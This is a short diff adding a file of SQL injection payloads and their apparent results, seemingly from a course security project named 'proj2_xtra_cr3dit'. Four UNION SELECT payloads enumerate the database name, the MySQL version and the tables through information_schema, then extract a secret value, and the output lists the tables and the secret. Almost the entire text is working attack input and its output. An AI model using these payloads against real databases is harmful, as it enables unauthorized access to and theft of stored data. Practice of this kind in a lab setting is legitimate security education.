@@ -1,0 +1,9 @@
+' union select 1,2,DATABASE();
+' union select 1,2,VERSION();
+' UNION SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = DATABASE();
+' union select 1,2,secret from SECRETTABLE;
+...
+Name: proj2_xtra_cr3dit
+Version: 8.0.39-0ubuntu0.22.04.1
+Tables: SECRETTABLE,foo,inject3_users
+Secret: hunter2
